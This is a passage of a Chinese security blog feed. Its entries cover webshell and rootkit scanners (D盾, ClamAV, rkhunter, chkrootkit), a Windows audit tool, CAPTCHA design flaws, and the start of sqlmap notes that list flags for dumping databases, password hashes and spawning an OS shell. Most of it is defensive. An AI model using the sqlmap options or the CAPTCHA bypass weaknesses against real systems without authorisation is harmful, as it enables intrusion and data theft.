D盾只有win版的，需要把源代码打包下来进行扫描，或使用nfs共享目录挂载到windows系统</span></span><br><span class="line"><span class="meta"># 这里使用tar把源码打包下来进行扫描</span></span><br><span class="line">tar -cvf webshell.tar webshell/</span><br></pre></td></tr></table></figure><img src="/linux-backdoor-killer/D盾.png" title="D盾webshell查杀"><h3 id="1-2-深信服WebShellkiller"><a href="#1-2-深信服WebShellkiller" class="headerlink" title="1.2 深信服WebShellkiller"></a>1.2 深信服WebShellkiller</h3><p>WebShellkiller作为一款web后门专杀工具，不仅支持webshell的扫描，同时还支持暗链的扫描。这是一款融合了多重检测引擎的查杀工具。在传统正则匹配的基础上，采用模拟执行，参数动态分析监测技术、webshell语义分析技术、暗链隐藏特征分析技术，并根据webshell的行为模式构建了基于机器学习的智能检测模型。传统技术与人工智能技术相结合、静态扫描和动态分析相结合，更精准地检测出WEB网站已知和未知的后门文件。</p><h4 id="安装使用-1"><a href="#安装使用-1" class="headerlink" title="安装使用"></a>安装使用</h4><p><a href="http://edr.sangfor.com.cn/tool/WebShellKillerTool.zip" target="_blank" rel="noopener">Windows</a><br><a href="http://edr.sangfor.com.cn/tool/WebShellKillerForLinux.tar.gz" target="_blank" rel="noopener">Linux</a><br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Windows平台同D盾</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># linux平台</span></span><br><span class="line"><span class="meta"># 下载WebShellkiller</span></span><br><span class="line">wget http:<span class="comment">//edr.sangfor.com.cn/tool/WebShellKillerForLinux.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 解压到当前目录</span></span><br><span class="line">tar -zxvf WebShellKillerForLinux.tar.gz </span><br><span class="line"><span class="meta"># 查看解压结果，可以看到多出centos_32、centos_64、linux_64三个文件夹</span></span><br><span class="line"><span class="meta"># 查看当前系统版本</span></span><br><span class="line">cat /etc/system-release &amp;&amp; uname -m</span><br><span class="line"></span><br><span class="line"><span class="meta"># 进入centos_64</span></span><br><span class="line">cd centos_64/wscan_app/</span><br><span class="line"></span><br><span class="line"><span class="meta"># wscan 默认没有可执行权限</span></span><br><span class="line">chmod u+x wscan</span><br><span class="line"></span><br><span class="line"><span class="meta"># wscan从LD_LIBRARY_PATH加载so文件，需要将当前路径加到LD_LIBRARY_PATH以使wscan能找到当前目录下的so</span></span><br><span class="line">export LD_LIBRARY_PATH=`pwd`:$LD_LIBRARY_PATH</span><br><span class="line"></span><br><span class="line"><span class="meta"># 执行扫描</span></span><br><span class="line">./wscan -hrf ../../webshell/jsp</span><br></pre></td></tr></table></figure></p><h3 id="1-3-CloudWalker（牧云）"><a href="#1-3-CloudWalker（牧云）" class="headerlink" title="1.3 CloudWalker（牧云）"></a>1.3 CloudWalker（牧云）</h3><p>CloudWalker（牧云）是长亭推出的一款开源服务器安全管理平台。根据项目计划会逐步覆盖服务器资产管理、威胁扫描、Webshell 查杀、基线检测等各项功能。</p><p>本次开源作为开源计划的第一步，仅包含 Webshell 检测引擎部分，重点调优 Webshell 检测效果。目前放出的是一个可执行的命令行版本 Webshell 检测工具。</p><h4 id="安装使用-2"><a href="#安装使用-2" class="headerlink" title="安装使用"></a>安装使用</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 工具打包形式为单个可执行文件，下载之后添加可执行权限即可执行。</span></span><br><span class="line">wget https:<span class="regexp">//gi</span>thub.com<span class="regexp">/chaitin/</span>cloudwalker<span class="regexp">/releases/</span>download<span class="regexp">/webshell-detector-1.0.0/</span>webshell-detector-<span class="number">1.0</span>.<span class="number">0</span>-linux-amd64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line">.<span class="regexp">/webshell-detector -html -output result.html /</span>var<span class="regexp">/www/</span>webshell<span class="regexp">/</span></span><br></pre></td></tr></table></figure><h2 id="木马后门类查杀"><a href="#木马后门类查杀" class="headerlink" title="木马后门类查杀"></a>木马后门类查杀</h2><p>可以设置定时任务定期查杀</p><h3 id="2-1-ClamAV"><a href="#2-1-ClamAV" class="headerlink" title="2.1 ClamAV"></a>2.1 ClamAV</h3><p>ClamAV是一个在命令行下查毒软件，是免费开源产品，支持多种平台，如：Linux/Unix、MAC OS X、Windows、OpenVMS。ClamAV是基于病毒扫描的命令行工具，但同时也有支持图形界面的ClamTK工具。为什么说是查毒软件呢，因为它不将杀毒作为主要功能，默认只能查出您服务器内的病毒，但是无法清除，至多删除文件。不过这样，已经对我们有很大帮助了。</p><h4 id="安装使用-3"><a href="#安装使用-3" class="headerlink" title="安装使用"></a>安装使用</h4><p>clamav的官方网站是<a href="http://www.clamav.net，" target="_blank" rel="noopener">http://www.clamav.net，</a> 可以从<a href="http://www.clamav.net/downloads" target="_blank" rel="noopener">http://www.clamav.net/downloads</a> 下载最新版本，也可以通过yum在线安装clamav，因为clamav包含在epel源中，所以方便起见，通过yum安装最简单。也可以编译安装<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Yum安装clamav</span></span><br><span class="line">yum <span class="keyword">install</span> epel-<span class="keyword">release</span></span><br><span class="line">yum -y <span class="keyword">install</span> clamav clamav-milter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新病毒库</span></span><br><span class="line">freshclam</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行扫描</span></span><br><span class="line">clamscan -r -l scan.log /<span class="keyword">var</span>/www/webshell</span><br><span class="line">-r 表示递归扫描子目录</span><br><span class="line">-l 增加扫描报告</span><br><span class="line"><span class="keyword">move</span> [路径] 表示移动病毒文件到指定的路径</span><br><span class="line">remove [路径] 表示扫描到病毒文件后自动删除病毒文件</span><br></pre></td></tr></table></figure></p><h3 id="2-2-rookit"><a href="#2-2-rookit" class="headerlink" title="2.2 rookit"></a>2.2 rookit</h3><p>rootkit是Linux平台下最常见的一种木 马后门工具，它主要通过替换系统文件来达到攻 击和和隐蔽的目的，这种木 马比普通木 马后门更加危险和隐蔽，普通的检测工具和检查手段很难发现这种木 马。rootkit攻 击能力极强，对系统的危害很大，它通过一套工具来建立后门和隐藏行迹，从而让攻 击者保住权限，以使它在任何时候都可以使用root权限登录到系统。</p><p>一般杀毒软件运行于ring3级别只能查杀ring3级别的木马，rookit是运行于ring0级别的木马，所以查杀rootkit也需要ring0级杀毒程序。Rootkit Hunter正是一款专门查杀rootkit的软件。</p><h4 id="2-2-1-RKHunter"><a href="#2-2-1-RKHunter" class="headerlink" title="2.2.1 RKHunter"></a>2.2.1 RKHunter</h4><p>Rkhunter的中文名叫“Rootkit猎手”, 目前可以发现大多数已知的rootkits和一些嗅探器以及后门程序。它通过执行一系列的测试脚本来确认服务器是否已经感染rootkits，比如检查rootkits使用的基本文件，可执行二进制文件的错误文件权限，检测内核模块等等。在官方的资料中，RKHunter可以作的事情有：</p><ol><li>MD5校验测试，​检测文件是否有改动</li><li>检测rootkit使用的二进制和系统工具文件</li><li>检测特洛伊木 马程序的特征码</li><li>检测常用程序的文件属性是否异常</li><li>检测系统相关的测试</li><li>检测隐藏文件</li><li>检测可疑的核心模块LKM</li><li>检测系统已启动的监听端口</li></ol><h5 id="安装使用-4"><a href="#安装使用-4" class="headerlink" title="安装使用"></a>安装使用</h5><p><a href="http://rootkit.nl/projects/rootkit_hunter.html" target="_blank" rel="noopener">官方地址</a><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yum安装rkhunter</span></span><br><span class="line">yum <span class="keyword">install</span> epel-<span class="keyword">release</span></span><br><span class="line">yum <span class="keyword">install</span> rkhunter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用的几个参数选项有：</span></span><br><span class="line">c, <span class="comment">--check 必选参数，表示检测当前系统</span></span><br><span class="line">configfile &lt;<span class="keyword">file</span>&gt; 使用特定的配置文件</span><br><span class="line">cronjob   作为cron任务定期运行</span><br><span class="line">sk, <span class="comment">--skip-keypress   自动完成所有检测，跳过键盘输入</span></span><br><span class="line">summary   显示检测结果的统计信息</span><br><span class="line"><span class="keyword">update</span>    检测更新内容</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用--skip-keypress参数跳过回车</span></span><br><span class="line">rkhunter -c <span class="comment">--skip-keypress</span></span><br></pre></td></tr></table></figure></p><p>检查主要分成6个部分</p><ol><li>进行系统命令的检查，主要是检测系统的二进制文件，因为这些文件最容易被rootkit。显示OK字样表示正常，显示Warning表示有异常，需要引起注意，而显示“Not found”字样，一般无需理会。</li><li>主要检测常见的rootkit程序，显示绿色的“Not found”表示系统未感染此rootkit。</li><li>主要是一些特殊或附加的检测，例如对rootkit文件或目录检测、对恶意软件检测以及对指定的内核模块检测。</li><li>主要对网络、系统端口、系统启动文件、系统用户和组配置、SSH配置、文件系统等进行检测。</li><li>主要是对应用程序版本进行检测。</li><li>其实是上面输出的一个总结，通过这个总结，可以大概了解服务器目录的安全状态。</li></ol><p>设置定时任务</p><p><code>0 3 * * * /usr/sbin/rkhunter -c --skip-keypress 2&gt;&amp;1 | mail -s &quot;rkhunter Reports of My Server&quot; you@yourdomain.com</code></p><h4 id="2-2-2-chkrootkit"><a href="#2-2-2-chkrootkit" class="headerlink" title="2.2.2 chkrootkit"></a>2.2.2 chkrootkit</h4><p>Chkrootkit是一个在本地系统检查rootkit痕迹的工具，它是检查系统二进制文件是否被rootkit病毒修改的一个shell脚本。</p><h5 id="安装说明"><a href="#安装说明" class="headerlink" title="安装说明"></a>安装说明</h5><p><a href="http://www.chkrootkit.org/" target="_blank" rel="noopener">官方地址</a><br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 安装编译工具包</span></span><br><span class="line">yum install gcc gcc-c++ make</span><br><span class="line">yum install glibc-<span class="keyword">static</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 安装chkrootkit </span></span><br><span class="line">wget ftp:<span class="comment">//ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span></span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit</span><br><span class="line">make sense</span><br><span class="line"><span class="meta"># 常用参数</span></span><br><span class="line">-h 显示帮助信息</span><br><span class="line">-V 显示版本信息</span><br><span class="line">-l 显示测试内容</span><br><span class="line">-d debug模式，显示检测过程的相关指令程序</span><br><span class="line">-q 安静模式，只显示有问题部分，</span><br><span class="line">-x 高级模式，显示所有检测结果</span><br><span class="line">-r dir 设定指定的目录为根目录</span><br><span class="line">-p dir1:dir2:dirN 检测指定目录</span><br><span class="line">-n 跳过NFS连接的目录</span><br><span class="line"></span><br><span class="line"><span class="meta"># 使用，出现INFECTED就说明系统可能有问题了</span></span><br><span class="line">./chkrootkit | grep INFECTED</span><br></pre></td></tr></table></figure></p><p>设置定时任务</p><p><code>0 3 * * * /usr/sbin/chkrootkit 2&gt;&amp;1 | mail -s &quot;chkrootkit Reports of My Server&quot; you@yourdomain.com</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-描述&quot;&gt;&lt;a href=&quot;#0x00-描述&quot; class=&quot;headerlink&quot; title=&quot;0x00 描述&quot;&gt;&lt;/a&gt;0x00 描述&lt;/h2&gt;&lt;p&gt;当我们的应用系统被入侵后，系统是否已被黑客上传webshell甚至植入木马后门程序。如果依靠人工排查，一是工作量大，二是需要一定程度的技术知识和业务知识才能判断什么是正常什么是异常。工作量大决定排查工作不可能由个别具有技术知识和业务知识的人来完成工作而需要其他人员参与，而如果这些没有“一定程度的技术知识和业务知识”的人员参与基本必然后导致大量的误报和漏报（主要是漏报）。总而言之，在大量设备场景中人工排查后门是很难切实有效推行的排查手段。&lt;/p&gt;
&lt;h2 id=&quot;0x01-Webshell查杀&quot;&gt;&lt;a href=&quot;#0x01-Webshell查杀&quot; class=&quot;headerlink&quot; title=&quot;0x01 Webshell查杀&quot;&gt;&lt;/a&gt;0x01 Webshell查杀&lt;/h2&gt;&lt;h3 id=&quot;1-1-D盾-Web查杀&quot;&gt;&lt;a href=&quot;#1-1-D盾-Web查杀&quot; class=&quot;headerlink&quot; title=&quot;1.1 D盾_Web查杀&quot;&gt;&lt;/a&gt;1.1 D盾_Web查杀&lt;/h3&gt;&lt;p&gt;D盾Web查杀是一个永久免费的网站D盾Web查杀，软件使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为&lt;/p&gt;
&lt;p&gt;引擎特别针对：一句话后门、变量函数后门、${}执行、`执行、preg_replace执行、call_user_func、file_put_contents、fputs 等特殊函数的参数进行针对性的识别，能查杀更为隐藏的后门，并把可疑的参数信息展现在你面前，让你能更快速的了解后门的情况&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PS: 不再更新D盾_web查杀的查杀引擎,只更新查杀库到2019.1.1，之后将不再更新查杀库&lt;br&gt;
    
    </summary>
    
      <category term="应急响应" scheme="http://www.pa55w0rd.club/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
      <category term="工具使用" scheme="http://www.pa55w0rd.club/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
      <category term="应急响应" scheme="http://www.pa55w0rd.club/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>WINSpect-基于Powershell的Windows安全审计工具</title>
    <link href="http://www.pa55w0rd.club/winspect/"/>
    <id>http://www.pa55w0rd.club/winspect/</id>
    <published>2018-12-03T03:59:36.000Z</published>
    <updated>2018-12-03T06:11:40.596Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/A-mIn3/WINspect" target="_blank" rel="noopener">项目地址</a></p></blockquote><h2 id="0x00-描述"><a href="#0x00-描述" class="headerlink" title="0x00 描述"></a>0x00 描述</h2><p>WINSpect是一款基于Powershell的Windows安全审计工具，可用于枚举和识别Windows平台的安全漏洞，以进一步的优化和加固平台的安全防护策略。</p><h2 id="0x01-功能"><a href="#0x01-功能" class="headerlink" title="0x01 功能"></a>0x01 功能</h2><p>WINSpect将为我们提供审计检查和枚举：</p><ul><li>检查已安装的安全产品</li><li>检查DLL劫持</li><li>检查用户账户控制设置<a id="more"></a></li><li>本地文件系统共享</li><li>具有本地组成员身份的域用户和组</li><li>注册表autoruns</li><li>可由Authenticated Users组成员配置的本地服务</li><li>Authenticated Users组成员可以写入相应二进制文件的本地服务</li><li>非system32 Windows托管服务及其相关的DLL</li><li>非引用服务路径漏洞</li><li>非系统计划任务DLL劫持</li><li>自动安装</li></ul><h2 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:A-mIn3/WINspect.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用管理员权限打开powershell，并运行WINSpect脚本</span></span><br><span class="line">.\WINspect.ps1</span><br></pre></td></tr></table></figure><h2 id="0x03-排错"><a href="#0x03-排错" class="headerlink" title="0x03 排错"></a>0x03 排错</h2><p>Win10系统使用过程中报错<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.\WINspect.ps1 : 无法加载文件 E:\WINspect\WINspect.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 http</span><br><span class="line">s:/go.microsoft.com/fwlink/?LinkID=<span class="number">135170</span> 中的 about_Execution_Policies。</span><br><span class="line">所在位置 行:<span class="number">1</span> 字符: <span class="number">1</span></span><br><span class="line">+ .\WINspect.ps1</span><br><span class="line">+ ~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : SecurityError: (:) []，PSSecurityException</span><br><span class="line">    + FullyQualifiedErrorId : UnauthorizedAccess</span><br></pre></td></tr></table></figure></p><p>是因为Windows PowerShell 执行策略限制你确定 Windows PowerShell 加载配置文件并运行脚本的条件。</p><p>通过<code>Get-ExecutionPolicy</code>命令获取挡前执行策略，默认执行策略为<code>Restricted</code></p><ul><li>允许单独的命令，但不会运行脚本。</li><li>阻止所有脚本文件的运行，包括格式设置文件和配置文件 (.ps1xml)、模块脚本文件 (.psm1) 和 Windows PowerShell 配置文件 (.ps1)。</li></ul><p>更改执行策略<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> -ExecutionPolicy RemoteSigned</span><br><span class="line"></span><br><span class="line">执行策略更改</span><br><span class="line">执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=<span class="number">135170</span></span><br><span class="line">中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?</span><br><span class="line">[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): y</span><br></pre></td></tr></table></figure></p><p>详细内容参考<a href="https://docs.microsoft.com/zh-cn/previous-versions/windows/powershell-scripting/hh847748(v=wps.640" target="_blank" rel="noopener">about_Execution_Policies</a>)</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/A-mIn3/WINspect&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;项目地址&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-描述&quot;&gt;&lt;a href=&quot;#0x00-描述&quot; class=&quot;headerlink&quot; title=&quot;0x00 描述&quot;&gt;&lt;/a&gt;0x00 描述&lt;/h2&gt;&lt;p&gt;WINSpect是一款基于Powershell的Windows安全审计工具，可用于枚举和识别Windows平台的安全漏洞，以进一步的优化和加固平台的安全防护策略。&lt;/p&gt;
&lt;h2 id=&quot;0x01-功能&quot;&gt;&lt;a href=&quot;#0x01-功能&quot; class=&quot;headerlink&quot; title=&quot;0x01 功能&quot;&gt;&lt;/a&gt;0x01 功能&lt;/h2&gt;&lt;p&gt;WINSpect将为我们提供审计检查和枚举：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;检查已安装的安全产品&lt;/li&gt;
&lt;li&gt;检查DLL劫持&lt;/li&gt;
&lt;li&gt;检查用户账户控制设置
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="windows 审计工具" scheme="http://www.pa55w0rd.club/tags/windows-%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>如何设计相对安全的图形验证码？ （转发）</title>
    <link href="http://www.pa55w0rd.club/captcha/"/>
    <id>http://www.pa55w0rd.club/captcha/</id>
    <published>2018-11-27T10:02:10.000Z</published>
    <updated>2018-11-27T10:46:09.333Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>转自 <a href="https://mp.weixin.qq.com/s/5hUS9Mbc1NHi5MEZpGcGEA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/5hUS9Mbc1NHi5MEZpGcGEA</a></p></blockquote><h2 id="0x00-验证码是什么"><a href="#0x00-验证码是什么" class="headerlink" title="0x00 验证码是什么"></a>0x00 验证码是什么</h2><p>验证码（CAPTCHA）即“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。</p><h2 id="0x01-有什么作用"><a href="#0x01-有什么作用" class="headerlink" title="0x01 有什么作用"></a>0x01 有什么作用</h2><p>简单概括如下：</p><p>验证码在网络投票、交友论坛、网上商城等业务中，经常用来防止恶意用户侵入、恶意灌水、刷票，爆破、撞库、接口滥用等问题，为防止客户端用程序进行自动识别，因此图片中通常要加上一些干扰象素，由用户肉眼识别其中的验证码信息。客户输入表单提交时，验证码也提交给网站服务器，只有验证成功，才能执行相应的操作，其在Web安全中有着重要的应用。 　　<br><a id="more"></a><br>好了，废话不多说，为了回答我们最初的问题，我们必须要知道图形验证码在设计和使用中有哪些坑，哪些地方容易出问题。</p><h2 id="0x02-设计或使用方法不当"><a href="#0x02-设计或使用方法不当" class="headerlink" title="0x02 设计或使用方法不当"></a>0x02 设计或使用方法不当</h2><ol><li>图形验证码数值在返回包中返回前端(可通过自动化程序输入验证码，导致验证码无效，导致防护失效)</li><li>图形验证码的值由前端生成，发送到后端形成图片</li><li>图形验证码验证后不失效（成功或失败都应该失效）,可以无限复用</li><li>单独验证图形验证码，正确返回1，错误返回0，而认证请求却不包含图形验证码（可以绕过前端验证）</li><li>万能图形验证码（测试环境为方便设置的万能验证码，上线后未关闭）</li><li>验证码参数值为空时不检测图形验证码</li><li>无验证码参数时(参数名和参数值都不存在)不检测图形验证码(一般是之前设计的时候没加图形验证码，后期添加图形验证码时保留了老接口)</li><li>验证码大小值由前端控制,后端无大小检测(生成超大图形验证码，造成内存耗尽，拒绝服务)</li><li>图形验证码过于简单(无扭曲，无干扰线导致，可自动化图像识别)</li><li>认证过程中，先验证账号密码，后验证图形验证码(逻辑顺序有误，验证码起不到防护作用)</li><li>验证码图片中数值不够随机，可预测导致可以猜解。</li></ol><h2 id="0x03-如何设计出一个相对安全的图形验证码"><a href="#0x03-如何设计出一个相对安全的图形验证码" class="headerlink" title="0x03 如何设计出一个相对安全的图形验证码"></a>0x03 如何设计出一个相对安全的图形验证码</h2><p><strong>设计上：</strong></p><ol><li>验证码字符集合和长度应可配置，至少四位，不允许单独使用英文字符或数字。</li><li>验证码要能够置设置背景色、字符颜色、字符旋转、扭曲、字符粘连等，要添加干扰线，干扰线的颜色、尺寸和数量要可通过配置进行设定。</li><li>验证码生成过程中不仅要使用安全随机函数还要确保种子绝对随机的，保证每次生成验证码的唯一性和不可预测性，防止重放攻击。</li><li>针对一次请求生成的验证码只能用一次，用完立即过期。每次生成的验证码不允许跨会话和请求使用。</li><li>验证码内容不允许以任何形式输出到客户端包括验证码的MD5值、 Base64转码值等。</li></ol><p><strong>另外图形验证码使用上应注意：</strong></p><ol><li>验证码参数和认证参数需要一起提交，到后端验证时要先验证验证码，正确后再进行后续认证。</li><li>后台系统中验证码的验证逻辑要先于口令的验证，只有通过验证码的验证后才能进行用户名、口令等其他身份信息的验证过程。</li><li>线上系统不应存在万能验证码，或不验证验证码内容的情况</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;转自 &lt;a href=&quot;https://mp.weixin.qq.com/s/5hUS9Mbc1NHi5MEZpGcGEA&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/5hUS9Mbc1NHi5MEZpGcGEA&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-验证码是什么&quot;&gt;&lt;a href=&quot;#0x00-验证码是什么&quot; class=&quot;headerlink&quot; title=&quot;0x00 验证码是什么&quot;&gt;&lt;/a&gt;0x00 验证码是什么&lt;/h2&gt;&lt;p&gt;验证码（CAPTCHA）即“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。&lt;/p&gt;
&lt;h2 id=&quot;0x01-有什么作用&quot;&gt;&lt;a href=&quot;#0x01-有什么作用&quot; class=&quot;headerlink&quot; title=&quot;0x01 有什么作用&quot;&gt;&lt;/a&gt;0x01 有什么作用&lt;/h2&gt;&lt;p&gt;简单概括如下：&lt;/p&gt;
&lt;p&gt;验证码在网络投票、交友论坛、网上商城等业务中，经常用来防止恶意用户侵入、恶意灌水、刷票，爆破、撞库、接口滥用等问题，为防止客户端用程序进行自动识别，因此图片中通常要加上一些干扰象素，由用户肉眼识别其中的验证码信息。客户输入表单提交时，验证码也提交给网站服务器，只有验证成功，才能执行相应的操作，其在Web安全中有着重要的应用。 　　&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="验证码安全" scheme="http://www.pa55w0rd.club/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="安全设计" scheme="http://www.pa55w0rd.club/tags/%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap笔记</title>
    <link href="http://www.pa55w0rd.club/sqlmap/"/>
    <id>http://www.pa55w0rd.club/sqlmap/</id>
    <published>2018-11-27T09:04:23.000Z</published>
    <updated>2018-12-04T08:51:02.988Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-安装"><a href="#0x00-安装" class="headerlink" title="0x00 安装"></a>0x00 安装</h2><p>git clone <a href="https://github.com/sqlmapproject/sqlmap.git" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap.git</a></p><h2 id="0x01-基本用法"><a href="#0x01-基本用法" class="headerlink" title="0x01 基本用法"></a>0x01 基本用法</h2><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-dbs       <span class="string">//</span>列举数据库</span><br><span class="line"><span class="params">--count</span> -D “数据库”   <span class="string">//</span>获取表中数据个数</span><br><span class="line"><span class="params">--current-db</span>           <span class="string">//</span>列举当前数据库</span><br><span class="line"><span class="params">--users</span> <span class="params">--passwords</span>              <span class="string">//</span>列举数据库用户名</span><br><span class="line"><span class="params">--current-user</span>               <span class="string">//</span>列举当前用户</span><br><span class="line"><span class="params">--privileges</span>               <span class="string">//</span>查看权限</span><br><span class="line"><span class="params">--os-shell</span>                    <span class="string">//</span>写web shell</span><br><span class="line"><span class="params">--is-dba</span>                    <span class="string">//</span>判断当前用户是不是dba</span><br><span class="line"><span class="params">--tables</span> -D <span class="string">"数据库"</span>          <span class="string">//</span>列举数据库的表名</span><br><span class="line"><span class="params">--columns</span> -T <span class="string">"表名"</span> -D <span class="string">"数据库"</span>       <span class="string">//</span> 列举列名</span><br><span class="line"><span class="params">--dump</span> -C <span class="string">"列名"</span> -T <span class="string">"表名"</span> -D <span class="string">"数据库"</span>           <span class="string">//</span>列举数据</span><br><span class="line"><span class="params">--start=</span>：指定开始的行</span><br><span class="line"><span class="params">--stop=</span>：指定结束的行</span><br><span class="line"><span class="params">--threads=</span>:线程数</span><br><span class="line"></span><br><span class="line">存储数据在 <span class="string">./sqlmap/output/.......</span></span><br><span class="line">-f <span class="params">--banner</span> <span class="params">--dbs</span> <span class="params">--users</span> <span class="params">--batch</span> <span class="params">--crawl=3</span></span><br><span class="line">当<span class="params">--level</span>为2以上，会尝试注入cookie</span><br><span class="line">当<span class="params">--level</span>为3以上，会尝试注入user-agent、referer</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 